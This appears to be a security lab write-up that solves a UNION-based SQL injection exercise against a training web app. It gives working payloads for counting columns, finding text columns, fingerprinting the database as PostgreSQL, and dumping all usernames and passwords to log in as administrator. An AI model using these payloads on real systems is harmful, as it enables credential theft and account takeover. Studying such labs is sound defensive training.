## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234063923-b0b6fd9b-bcfe-4402-8744-51b531964880.png)

## Solution :

**String concatenation**

You can concatenate together multiple strings to make a single string.

|    Name    	| Command                                               	|
|:----------:	|-------------------------------------------------------	|
|  MICROSOFT 	| 'foo'+'bar'                                           	|
| POSTgreSQL 	| 'foo'\|\|'bar'                                        	|
| MYSQL      	| 'foo' 'bar' [Note the space between the two strings]  	|
|            	| CONCAT('foo','bar')                                   	|
| ORACLE     	| 'foo'\| \|'bar'                                       	|

![image](https://user-images.githubusercontent.com/67383098/234099775-aff90330-5a21-4f1c-b6dc-9ef2c8876828.png)


Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Determine the number of columns -

**ORDER BY 3** returns an error, which means there are 2 columns that is retreived by the web app from the db.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://user-images.githubusercontent.com/67383098/234100850-1429bcfe-1266-4a8f-8b53-2d71ad49587f.png)

#### Determine which columns contain text data -

**1st column**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'A',NULL --
```

![image](https://user-images.githubusercontent.com/67383098/234101123-9ccf4bb2-f157-46c3-a922-980a8431d801.png)

**2nd Column**

This column contains text data 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'A' --
```

![image](https://user-images.githubusercontent.com/67383098/234103514-41c451e2-917f-4ac9-8f4f-b7a9c9217f4a.png)


#### Determine the type of database -

![image](https://user-images.githubusercontent.com/67383098/234103785-85a81ddb-49ca-4be0-8dbf-ef42516379e4.png)

Since we know 2nd column is containing text data, we can try to use version command of each database system to identify the type of database present in the backend.

**ORACLE**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

![image](https://user-images.githubusercontent.com/67383098/234104531-16e2f879-e4c4-4b72-92c2-0baf47edcf77.png)

500 - SERVER ERROR

**Microsoft**


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,@@version --
```

![image](https://user-images.githubusercontent.com/67383098/234104810-7e4797ff-8afc-4eb2-a2ce-2d8329508b15.png)

500 - Server Error

> NOTE - Syntax for findng version is the same for both Microsoft and MYSQL



**PostgreSQL**



```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,version() --
```

![image](https://user-images.githubusercontent.com/67383098/234105240-04daa44f-2c9f-4e79-8974-5038f94bb8c5.png)

We can confirm that this is an POSTgreSQL db in backend.

![image](https://user-images.githubusercontent.com/67383098/234105811-4f3c1b1f-51c9-4dcd-8963-053ba9c25f4f.png)

#### Retreive multiple values in single column -

For POSTgreSQL , the syntax for string concatination is `'foo'||'bar'`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,username||'-'||password FROM users --
```

![image](https://user-images.githubusercontent.com/67383098/234107431-6b69680b-ac33-4eb6-96c6-3edf2624ebcb.png)

We got all the usernames & passwords,

![image](https://user-images.githubusercontent.com/67383098/234107604-f2526cb0-8b70-448d-b647-1c7b2c9788dd.png)

Now we can login as administrator

![image](https://user-images.githubusercontent.com/67383098/234107784-09bfaa9b-1505-4a11-abab-4550aae622e9.png)

































